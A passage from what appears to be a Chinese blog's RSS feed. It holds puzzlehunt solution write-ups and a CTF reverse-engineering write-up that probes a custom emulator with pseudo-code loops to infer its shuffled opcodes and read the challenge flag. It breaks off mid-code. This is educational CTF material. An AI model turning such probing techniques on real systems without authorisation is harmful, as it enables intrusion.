<td></td>
<td>?</td>
</tr>
<tr>
<td>luckin coffee</td>
<td>i</td>
</tr>
<tr>
<td>jvr music</td>
<td>s</td>
</tr>
<tr>
<td>youth with you</td>
<td>w</td>
</tr>
<tr>
<td></td>
<td>?</td>
</tr>
<tr>
<td>league of legends</td>
<td>e</td>
</tr>
<tr>
<td>KFC</td>
<td>k</td>
</tr>
<tr>
<td></td>
<td>?</td>
</tr>
<tr>
<td></td>
<td>?</td>
</tr>
</tbody>
</table>
<p>
猜测这些字母组成bilibili&#39;s weekly，而B站确实有个每周必看，但是怎么和下面的图联系起来呢？</p>
<p>
观察图片中的相似处，每个图都有个四位数，像是日期，也都有一个分数，分母都是10。B站视频的id都是十位，那这个分数可能就是用来ID提取，日期有可能是视频的日期，也可能是每周必看的日期，找到每周必看后先找封面是这些图片的视频再找到ID。<br>
搜索过程中发现，每期必看都在周五更新，而且都有个标题。我第一个尝试的是左下角的图片，8月23日对应的只有<a href="https://www.bilibili.com/v/popular/weekly/?num=22">第22期</a>，在2019年8月23日更新的，标题是霸道总裁黄晓明。进去看到第一个视频的封面就和题里的十分相似，于是可以明确四位数就是更新日期，再从视频列表中找出相似的原封面和对应视频ID。而这个标题也让我想到第一张图里一个还没填的“今天在某部真人秀里学到了一句强势拒绝别人指手画脚的话呢”，原来下面的视频封面，或者说每周必看标题，也都和上面的答案有关系！<br>
这样找到所有日期对应的每周必看，通过标题联系到第一张图里每一行并可以填完剩余空格，再找到视频ID，按照图一问题的顺序提取就能得到最终结果。<br>
不过找相似图片的过程并不是很顺利，有些很难找到到底哪个是原图，比如：
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8hg80xz1m4.webp"/>
</figure>

后来队友发现了一个好方法，把眼镜摘掉再看，AI生成的图和原图看起来就一模一样。最终结果就不放出来了，有兴趣的可以试试找这几个图<a href="https://www.bilibili.com/v/popular/weekly/?num=199">0113</a>，<a href="https://www.bilibili.com/v/popular/weekly/?num=167">0603</a>，<a href="https://www.bilibili.com/v/popular/weekly/?num=172">0708</a>，<a href="https://www.bilibili.com/v/popular/weekly/?num=233">0908</a>。</p>
</div>
</div>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>江湖解谜总结一</title>
      <link>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%B8%80/</link>
      <pubDate>Mon, 04 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/%E6%B1%9F%E6%B9%96%E8%A7%A3%E8%B0%9C%E6%80%BB%E7%BB%93%E4%B8%80/</guid>
      <description> 简介 本次解谜活动由2月23日晚8点开始到3月3日晚8点结束。不像以前都是我一个人参加，这一次找了一支队伍一起做，虽然真正参与的也就两个半人左右，不过解题速度远比一个人快。虽然最终遗憾没有完赛，但在未完赛队伍里排第一名。 这次活动开始一开始还由于过于火爆导致网站无法访问，只能用腾讯文档先放出前三道题，第二天中午网站才能访问。这次的谜题包括信息搜索的，推理的，谐音的，纸笔类的等等，我会选择一些印象深刻的介绍一遍。这次就从第一个区域初入武当开始。&#xA;初入武当 行间字里 首先需要理解第一张图的意思，找出规律。第一个很好理解，“筒”差了竹字头，红色问号就是竹字头。第二个单词看起来是SAFE，女王两个字的形状和左边两个问号形状相同，但为什么问号是女王两个字呢？&#xA;联想到SAFE的中文是“安全”，那安全和女王又有什么联系，就是安全的下半部分为女王，正好也对应了SAFE只显示了下面一半。因此可以推出规律红色问号都代表了一个或部分汉字，形状也与问号形状相同。&#xA;下面就需要解第二张图里的内容了。看起来很杂乱，不过可以逐个分析。&#xA;左上方橙色是“讯”字，绿色是“计”字，那不在绿色圆圈但在橙色圆圈里的部分，即二者之差，问号表示的就是“㇈” 中上有几个化学式，是盐酸HCL和硝酸HNO3，但是不能匹配两个问号，注意到盐酸写了三个，其实是想表达由盐酸和硝酸3:1组成的王水 化学式上面像是DOG的上一半，但“狗”是左右结构的，那会不会是“犬”的上半部分呢，尝试用它和王水组成新的字，果然可以组成“球” 右上角的犬和彡不清楚如何转化成右边的方格，但查询拼音为xiū的字里只有两个是包含彡的：俢修，而拼音为shū且包含犬的字有一个：倏，那大致可以推测出左侧方格就是两个字相同的部分，即亻或亻与丨 右上角方格里的答案没有想到是什么 左上角也有同样的图形，能与下方㇈组成字的只有“气”。现在前两个字就已经推出来了，可以猜测这张图被分成了六个部分，分别对应六个字 左下角PULL和PUSH表示拉和推，那问号应该是“扌”，但是一和黄色怎么对应没有想到 下方中间是简单的数字与字母对应，如果是字母序，那13应该是M，13是K的情况可以联想到扑克牌，那么11就是J，和J相似的汉字是“丁” 右边有三个半多字，但是这里不能把它当成多字，而是“夕”，那么三个半多就是七夕，上下两个问号分别就是“七”和“夕”。 右下角五角星变为五边形，两条线应该也变成一个多边形，而且这个字上面是“夕”，那么只有可能是“名”，再看两条线为什么变成长方形，两者联系应为把左边形状的顶点相连组成右边的图形。 至此我推出了大部分，已知的信息是&#xA;气 球 ？亻七 扌 丁 名 可以和丁名组成词的应该是“拉”丁名，而右上角的字像包含化，且可以和气球组成词，猜测是“花”字，那么最终结果为气球花拉丁名，输入答案结果正确。&#xA;看过解析后，也明白了没推出来的部分。&#xA;音≈风险 义≈付出即这个词读音和fengxian相似，意思为付出，那就是奉献，倒过来问号部分即为“艹”，能和下面组成“花” 一为黄，指的是横线为黄，即横的右边，那么竖对应下半部分“立”，和扌组成了拉 </description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
简介
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>本次<a href="https://jh2024.jianghujiemi.fun/">解谜活动</a>由2月23日晚8点开始到3月3日晚8点结束。不像以前都是我一个人参加，这一次找了一支队伍一起做，虽然真正参与的也就两个半人左右，不过解题速度远比一个人快。虽然最终遗憾没有完赛，但在未完赛队伍里排第一名。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.syourrvax.webp"/>
</figure>

这次活动开始一开始还由于过于火爆导致网站无法访问，只能用腾讯文档先放出前三道题，第二天中午网站才能访问。这次的谜题包括信息搜索的，推理的，谐音的，纸笔类的等等，我会选择一些印象深刻的介绍一遍。这次就从第一个区域初入武当开始。</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
初入武当
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<div id="outline-container-headline-3" class="outline-3">
<h3 id="headline-3">
行间字里
</h3>
<div id="outline-text-headline-3" class="outline-text-3">
<p><figure><img src="https://wind1900.github.io/picx-images-hosting/byline_1[1].32hpfmxo13.webp"/>
</figure>

<figure><img src="https://wind1900.github.io/picx-images-hosting/image.1lbkdvuvn2.webp"/>
</figure>

首先需要理解第一张图的意思，找出规律。第一个很好理解，“筒”差了竹字头，红色问号就是竹字头。第二个单词看起来是SAFE，女王两个字的形状和左边两个问号形状相同，但为什么问号是女王两个字呢？<br>
联想到SAFE的中文是“安全”，那安全和女王又有什么联系，就是安全的下半部分为女王，正好也对应了SAFE只显示了下面一半。因此可以推出规律红色问号都代表了一个或部分汉字，形状也与问号形状相同。<br>
下面就需要解第二张图里的内容了。看起来很杂乱，不过可以逐个分析。</p>
<ul>
<li>左上方橙色是“讯”字，绿色是“计”字，那不在绿色圆圈但在橙色圆圈里的部分，即二者之差，问号表示的就是“㇈”</li>
<li>中上有几个化学式，是盐酸HCL和硝酸HNO<sub>3</sub>，但是不能匹配两个问号，注意到盐酸写了三个，其实是想表达由盐酸和硝酸3:1组成的王水</li>
<li>化学式上面像是DOG的上一半，但“狗”是左右结构的，那会不会是“犬”的上半部分呢，尝试用它和王水组成新的字，果然可以组成“球”</li>
<li>右上角的犬和彡不清楚如何转化成右边的方格，但查询拼音为xiū的字里只有两个是包含彡的：俢修，而拼音为shū且包含犬的字有一个：倏，那大致可以推测出左侧方格就是两个字相同的部分，即亻或亻与丨</li>
<li>右上角方格里的答案没有想到是什么</li>
<li>左上角也有同样的图形，能与下方㇈组成字的只有“气”。现在前两个字就已经推出来了，可以猜测这张图被分成了六个部分，分别对应六个字</li>
<li>左下角PULL和PUSH表示拉和推，那问号应该是“扌”，但是一和黄色怎么对应没有想到</li>
<li>下方中间是简单的数字与字母对应，如果是字母序，那13应该是M，13是K的情况可以联想到扑克牌，那么11就是J，和J相似的汉字是“丁”</li>
<li>右边有三个半多字，但是这里不能把它当成多字，而是“夕”，那么三个半多就是七夕，上下两个问号分别就是“七”和“夕”。</li>
<li>右下角五角星变为五边形，两条线应该也变成一个多边形，而且这个字上面是“夕”，那么只有可能是“名”，再看两条线为什么变成长方形，两者联系应为把左边形状的顶点相连组成右边的图形。</li>
<li>
<p>至此我推出了大部分，已知的信息是</p>
<table>
<tbody>
<tr>
<td>气</td>
<td>球</td>
<td>？亻七</td>
</tr>
<tr>
<td>扌</td>
<td>丁</td>
<td>名</td>
</tr>
</tbody>
</table>
</li>
</ul>
<p>可以和丁名组成词的应该是“拉”丁名，而右上角的字像包含化，且可以和气球组成词，猜测是“花”字，那么最终结果为气球花拉丁名，输入答案结果正确。<br>
看过解析后，也明白了没推出来的部分。</p>
<ul>
<li>音≈风险 义≈付出即这个词读音和fengxian相似，意思为付出，那就是奉献，倒过来问号部分即为“艹”，能和下面组成“花”</li>
<li>一为黄，指的是横线为黄，即横的右边，那么竖对应下半部分“立”，和扌组成了拉</li>
</ul>
</div>
</div>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>龙腾喵跃红包封面解谜</title>
      <link>https://wind1900.github.io/puzzlehunt/%E9%BE%99%E8%85%BE%E5%96%B5%E8%B7%83%E7%BA%A2%E5%8C%85%E5%B0%81%E9%9D%A2%E8%A7%A3%E8%B0%9C/</link>
      <pubDate>Tue, 20 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/%E9%BE%99%E8%85%BE%E5%96%B5%E8%B7%83%E7%BA%A2%E5%8C%85%E5%B0%81%E9%9D%A2%E8%A7%A3%E8%B0%9C/</guid>
      <description> 首先注意红色的部分，一共四行，每行前两个字都标为红色。“莫思”最能引起我的联想，即摩斯密码，那其它三行也应该是一种编码的名称谐音，四行分别为：五笔，旗语，摩斯，棋盘。每行后面标记为红色的部位，或能看成字母，或能看成数字，或者是特定编码用到的图形，翻译后得到：&#xA;五笔：空拍 旗语：weikong 摩斯：jiezou 棋盘：shangse 怎么给节奏上色？当时没想明白。其实多观察一下乐谱的格式就能发现，每一列的节奏型都很相似，如果转化为一个表格再上色，有可能会解出答案。后来要了提示知道了解法： 按照表格填色后即可得到答案LONG JUMP，也祝大家龙年龙腾喵跃。&#xA;题目链接 https://mp.weixin.qq.com/s/AF8BJjf07MjLq34hA1ncjg </description>
      <content:encoded><![CDATA[
<p>
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2ob94j2o0j.webp"/>
</figure>
</p>
<p>
首先注意红色的部分，一共四行，每行前两个字都标为红色。“莫思”最能引起我的联想，即摩斯密码，那其它三行也应该是一种编码的名称谐音，四行分别为：五笔，旗语，摩斯，棋盘。每行后面标记为红色的部位，或能看成字母，或能看成数字，或者是特定编码用到的图形，翻译后得到：</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  五笔：空拍
</span></span><span style="display:flex;"><span>  旗语：weikong
</span></span><span style="display:flex;"><span>  摩斯：jiezou
</span></span><span style="display:flex;"><span>  棋盘：shangse</span></span></code></pre></div>
</div>
<p>
怎么给节奏上色？当时没想明白。其实多观察一下乐谱的格式就能发现，每一列的节奏型都很相似，如果转化为一个表格再上色，有可能会解出答案。后来要了提示知道了解法：
<figure><img src="https://wind1900.github.io/picx-images-hosting/6786a973e2281afb4cfa97cb2646770.54xhjkvdmq.webp"/>
</figure>
</p>
<p>
按照表格填色后即可得到答案LONG JUMP，也祝大家龙年龙腾喵跃。</p>
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
题目链接
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<ul>
<li><a href="https://mp.weixin.qq.com/s/AF8BJjf07MjLq34hA1ncjg">https://mp.weixin.qq.com/s/AF8BJjf07MjLq34hA1ncjg</a></li>
</ul>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>58anY 解析</title>
      <link>https://wind1900.github.io/ctf/58any_%E8%A7%A3%E6%9E%90/</link>
      <pubDate>Mon, 19 Feb 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/ctf/58any_%E8%A7%A3%E6%9E%90/</guid>
      <description>本题是egelloc.nwp的reverse的最后一题，为了避免泄露答案，所有的单词均以倒序拼写。根据前面几关的练习，已知这道题自定义了一个模拟器，拥有自己的指令，寄存器和内存，需要你输入模拟器指令来拿到flag。但是与前面的题目不同的是，指令和寄存器的标志都是随机的，不是固定的，无法通过静态分析获得，因此需要根据现有已知的条件动态推断出所有的指令和寄存器等。&#xA;58anY 的体系结构 内存 内存由一个byte[1024]的数组a构成。内存的前768个byte为代码段，保存用户输入的指令。768后的内存为数据段，数据存储的地址从0开始。因为栈寄存器起始为0，a[768]往后的一段空间应仅供栈使用，避免出现冲突。&#xA;寄存器 寄存器包括4个通用寄存器a b c d, 栈寄存器s，指令寄存器i以及标志寄存器f 。寄存器地址紧跟在内存后面，因此在代码中也用a[1024]~a[1030]来访问。在指令中由不同的操作数代表不同寄存器，每个操作数的二进制只有一位为1，即用1，2，4，8，16，32，64，128中的7个来代表寄存器。由于模拟器运行时会随机打乱操作数的顺序，无法通过静态分析知道操作数与寄存器的对应关系&#xA;指令 每个指令长度为3 bytes，指令与两个操作数各用一个byte，但是指令与操作数的位置每道题不一样，仅在最后构造读取flag指令的时候需要注意。每个指令也由20~27这8个数来表示，对应关系未知。&#xA;imm op1, op2 将op2表示的数存入op1表示的寄存器 add op1, op2 将op2表示的寄存器的值加到op1表示的寄存器 stk op1, op2 栈操作，op2不为0时，将op2表示的寄存器中的值入栈，op1不为0时,再将栈顶数出栈于op1表示的寄存器 stm op1, op2 以op1表示的寄存器中的值作为地址,写入op2表示的寄存器中的值 ldm op1, op2 以op2表示的寄存器中的值作为地址，读取数据并存入op1表示的寄存器 cmp op1, op2 比较op1和op2表示的寄存器中的值，并根据大小，是否相等设置相关标志位 jmp op1, op2 op1为0时，无条件跳转到op2表示的寄存器中的值，op1不为0时，判断op1和标志寄存器与的结果，不为0则跳转到op2表示的寄存器中的值，通过修改指令寄存器的值实现跳转 sys op1, op2 根据op1的值进行不同的系统调用，并将结果存入op2表示的寄存器（exit不需要将结果存入寄存器）。系统调用需要的参数通过寄存器a,b,c传入 指令描述 系统调用 该模拟器实现的系统调用有open, read, write, sleep, exit等，使用open, read, write即可读取flag并打印。&#xA;已知条件 虽然随机打乱了寄存器，指令，系统调用和标志位的顺序，我们仍可以观察程序运行的状态来推测出一些指令和寄存器的标志。以下是代码流程中一些需要注意的地方：&#xA;随机打乱的函数中调用的是rand()而非没有srand()，即每次产生的随机数序列都是相同的，寄存器，指令与操作码的对应关系不会改变。 判断指令使用的是and操作，顺序参照上表顺序，若指令有多位为1，则会执行多条指令，若指令为0，则没有对应指令执行，不会报错，继续执行下一条指令。 指令寄存器i从0开始每执行一条指令就加1，代码段最开始都会置0，如果程序没有终止，那指令寄存器就会从0一直加到0xFF，之后加一溢出重新变为0，达到死循环状态。 与寄存器相关的操作都使用==进行判断操作数对应哪个寄存器，如果没找到对应寄存器或使用0为操作数，则会报错输出&amp;#34;unknown register&amp;#34;并退出程序。 判断系统调用使用and操作，若有多位位1，则会执行多个系统调用，若没找到对应系统调用，不会报错，继续执行下一条指令。 推断过程 通过构建不同的指令，根据程序执行的状态是退出或者死循环来逐步推测出指令，寄存器，和系统调用的对应关系。&#xA;寻找无效寄存器 将指令码设置为0xff，那么一定会执行imm，再遍历所有寄存器标志，如果程序退出并输出&amp;#34;unknown register&amp;#34;，那么该标志为 register_invalid 。</description>
      <content:encoded><![CDATA[
<p>
本题是egelloc.nwp的reverse的最后一题，为了避免泄露答案，所有的单词均以倒序拼写。根据前面几关的练习，已知这道题自定义了一个模拟器，拥有自己的指令，寄存器和内存，需要你输入模拟器指令来拿到flag。但是与前面的题目不同的是，指令和寄存器的标志都是随机的，不是固定的，无法通过静态分析获得，因此需要根据现有已知的条件动态推断出所有的指令和寄存器等。</p>
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
58anY 的体系结构
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<div id="outline-container-headline-2" class="outline-3">
<h3 id="headline-2">
内存
</h3>
<div id="outline-text-headline-2" class="outline-text-3">
<p>内存由一个byte[1024]的数组a构成。内存的前768个byte为代码段，保存用户输入的指令。768后的内存为数据段，数据存储的地址从0开始。因为栈寄存器起始为0，a[768]往后的一段空间应仅供栈使用，避免出现冲突。</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-3">
<h3 id="headline-3">
寄存器
</h3>
<div id="outline-text-headline-3" class="outline-text-3">
<p>寄存器包括4个通用寄存器a b c d, 栈寄存器s，指令寄存器i以及标志寄存器f 。寄存器地址紧跟在内存后面，因此在代码中也用a[1024]~a[1030]来访问。在指令中由不同的操作数代表不同寄存器，每个操作数的二进制只有一位为1，即用1，2，4，8，16，32，64，128中的7个来代表寄存器。由于模拟器运行时会随机打乱操作数的顺序，无法通过静态分析知道操作数与寄存器的对应关系</p>
</div>
</div>
<div id="outline-container-headline-4" class="outline-3">
<h3 id="headline-4">
指令
</h3>
<div id="outline-text-headline-4" class="outline-text-3">
<p>每个指令长度为3 bytes，指令与两个操作数各用一个byte，但是指令与操作数的位置每道题不一样，仅在最后构造读取flag指令的时候需要注意。每个指令也由2<sup>0</sup>~2<sup>7</sup>这8个数来表示，对应关系未知。</p>
<figure>
<table>
<tbody>
<tr>
<td>imm op1, op2</td>
<td>将op2表示的数存入op1表示的寄存器</td>
</tr>
<tr>
<td>add op1, op2</td>
<td>将op2表示的寄存器的值加到op1表示的寄存器</td>
</tr>
<tr>
<td>stk op1, op2</td>
<td>栈操作，op2不为0时，将op2表示的寄存器中的值入栈，op1不为0时,再将栈顶数出栈于op1表示的寄存器</td>
</tr>
<tr>
<td>stm op1, op2</td>
<td>以op1表示的寄存器中的值作为地址,写入op2表示的寄存器中的值</td>
</tr>
<tr>
<td>ldm op1, op2</td>
<td>以op2表示的寄存器中的值作为地址，读取数据并存入op1表示的寄存器</td>
</tr>
<tr>
<td>cmp op1, op2</td>
<td>比较op1和op2表示的寄存器中的值，并根据大小，是否相等设置相关标志位</td>
</tr>
<tr>
<td>jmp op1, op2</td>
<td>op1为0时，无条件跳转到op2表示的寄存器中的值，op1不为0时，判断op1和标志寄存器与的结果，不为0则跳转到op2表示的寄存器中的值，通过修改指令寄存器的值实现跳转</td>
</tr>
<tr>
<td>sys op1, op2</td>
<td>根据op1的值进行不同的系统调用，并将结果存入op2表示的寄存器（exit不需要将结果存入寄存器）。系统调用需要的参数通过寄存器a,b,c传入</td>
</tr>
</tbody>
</table>
<figcaption>
指令描述
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-headline-5" class="outline-3">
<h3 id="headline-5">
系统调用
</h3>
<div id="outline-text-headline-5" class="outline-text-3">
<p>该模拟器实现的系统调用有open, read, write, sleep, exit等，使用open, read, write即可读取flag并打印。</p>
</div>
</div>
</div>
</div>
<div id="outline-container-headline-6" class="outline-2">
<h2 id="headline-6">
已知条件
</h2>
<div id="outline-text-headline-6" class="outline-text-2">
<p>虽然随机打乱了寄存器，指令，系统调用和标志位的顺序，我们仍可以观察程序运行的状态来推测出一些指令和寄存器的标志。以下是代码流程中一些需要注意的地方：</p>
<ul>
<li>随机打乱的函数中调用的是rand()而非没有srand()，即每次产生的随机数序列都是相同的，寄存器，指令与操作码的对应关系不会改变。</li>
<li>判断指令使用的是and操作，顺序参照上表顺序，若指令有多位为1，则会执行多条指令，若指令为0，则没有对应指令执行，不会报错，继续执行下一条指令。</li>
<li>指令寄存器i从0开始每执行一条指令就加1，代码段最开始都会置0，如果程序没有终止，那指令寄存器就会从0一直加到0xFF，之后加一溢出重新变为0，达到死循环状态。</li>
<li>与寄存器相关的操作都使用==进行判断操作数对应哪个寄存器，如果没找到对应寄存器或使用0为操作数，则会报错输出&#34;unknown register&#34;并退出程序。</li>
<li>判断系统调用使用and操作，若有多位位1，则会执行多个系统调用，若没找到对应系统调用，不会报错，继续执行下一条指令。</li>
</ul>
</div>
</div>
<div id="outline-container-headline-7" class="outline-2">
<h2 id="headline-7">
推断过程
</h2>
<div id="outline-text-headline-7" class="outline-text-2">
<p>通过构建不同的指令，根据程序执行的状态是退出或者死循环来逐步推测出指令，寄存器，和系统调用的对应关系。</p>
<div id="outline-container-headline-8" class="outline-3">
<h3 id="headline-8">
寻找无效寄存器
</h3>
<div id="outline-text-headline-8" class="outline-text-3">
<p>将指令码设置为0xff，那么一定会执行imm，再遍历所有寄存器标志，如果程序退出并输出&#34;unknown register&#34;，那么该标志为 <code>register_invalid</code> 。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> register <span style="color:#f92672">in</span> set([<span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>]):
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">0xff</span> register, register</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-9" class="outline-3">
<h3 id="headline-9">
寻找sys指令和exit系统调用
</h3>
<div id="outline-text-headline-9" class="outline-text-3">
<p>遍历指令码和系统调用，并将op2设置为 <code>register_invalid</code> ，那么当程序退出且没有输出&#34;unknown register&#34;的时候，即为通过exit退出。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># [sys] [exit], register_invalid</span>
</span></span><span style="display:flex;"><span>  possible_values <span style="color:#f92672">=</span> set([<span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x80</span>])
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> instruction <span style="color:#f92672">in</span> possible_values:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> syscall <span style="color:#f92672">in</span> possible_values:
</span></span><span style="display:flex;"><span>          instruction syscall, register_invalid</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-10" class="outline-3">
<h3 id="headline-10">
寻找imm指令和指令寄存器i
</h3>
<div id="outline-text-headline-10" class="outline-text-3">
<p>现在已知sys指令，从剩余指令和所有寄存器中遍历，并将op2设置为 <code>register_invalid</code> ，然后添加一条无效寄存器的指令来终止程序。在剩下的指令中add，stk，stm，ldm，cmp，jmp都会因为op2为无效寄存器而退出，只有imm改变指令寄存器i设置的情况会使程序进入死循环。另外要注意特殊情况，当register_invalid==1的时候，指令寄存器i被置为1，执行第二条无效语句也会退出，因此多加一条imm语句使终止程序的语句后移。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># [imm] [i], register_invalid</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 0xff register_invalid, register_invalid</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> inst <span style="color:#f92672">in</span> get_possible_instructions():
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> op1 <span style="color:#f92672">in</span> get_possible_registers():
</span></span><span style="display:flex;"><span>          inst op1, register_invalid
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> register_invalid <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>              inst op1, register_invalid
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">0xff</span> register_invalid, register_invalid <span style="color:#75715e"># 用来终止程序</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-11" class="outline-3">
<h3 id="headline-11">
寻找stk指令
</h3>
<div id="outline-text-headline-11" class="outline-text-3">
<p>使用stk指令将寄存器i置为0以达到死循环的目的，若指令不为stk，则会导致程序退出。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># [stk] i, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm  register_invalid, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> inst <span style="color:#f92672">in</span> get_possible_instructions():
</span></span><span style="display:flex;"><span>      inst i, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>      imm register_invalid, <span style="color:#ae81ff">0</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-12" class="outline-3">
<h3 id="headline-12">
寻找栈寄存器s
</h3>
<div id="outline-text-headline-12" class="outline-text-3">
<p>使用stk指令操作栈寄存器s，注意stk指令在两个操作数均不为0时会依次进行入栈和出栈操作，入栈时会先将栈寄存器加一，再存入数据。因此使用指令 <code>stk i, s</code> 会使指令寄存器变为1进而执行无效寄存器指令退出。其它寄存器会使指令寄存器始终为0进入死循环。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># stk i, [s]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm register_invalid, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> register_s <span style="color:#f92672">in</span> get_possible_registers():
</span></span><span style="display:flex;"><span>      stk i, register_s
</span></span><span style="display:flex;"><span>      imm register_invalid, <span style="color:#ae81ff">0</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-13" class="outline-3">
<h3 id="headline-13">
寻找ldm指令
</h3>
<div id="outline-text-headline-13" class="outline-text-3">
<p>目前未知的指令还有add，stm，ldm，cmp，jmp，使用指令 <code>ldm i, s</code> 会使指令寄存器始终为0进入死循环，而其它指令会继续执行遇到无效寄存器指令退出。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># [ldm] i, s</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm register_invalid, 0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> inst <span style="color:#f92672">in</span> get_possible_instructions():
</span></span><span style="display:flex;"><span>      inst i, s
</span></span><span style="display:flex;"><span>      imm register_invalid, <span style="color:#ae81ff">0</span></span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-14" class="outline-3">
<h3 id="headline-14">
寻找stm指令
</h3>
<div id="outline-text-headline-14" class="outline-text-3">
<p>目前未知的指令还有add，stm，cmp，jmp，已知寄存器只有s和i。寻找stm的思路就是随机选择另一个寄存器 <code>reg</code> （通用寄存器或标志寄存器）， 配合stm与ldm来对指令寄存器赋值，跳转到第4条无效寄存器指令退出。如果是add，cmp指令，内存中不会写入4，赋给指令寄存器的值为0，进入死循环。如果是jmp指令 <code>jmp reg, s</code> ，需要判断 <code>reg</code> 是否为标志寄存器，若不为标志寄存器，则不会发生跳转，若刚好随机选择了标志寄存器，为了防止跳转到第4条指令，需要使跳转条件不成立，因此将 <code>reg</code> 的值设为 <code>0xff-reg</code> ，两个数的与为0，不会跳转。</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#75715e"># try to construct:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm reg, 0xff-reg</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm s, 4</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># [stm] reg, s</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># ldm i, reg</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># imm register_invalid, 0</span>
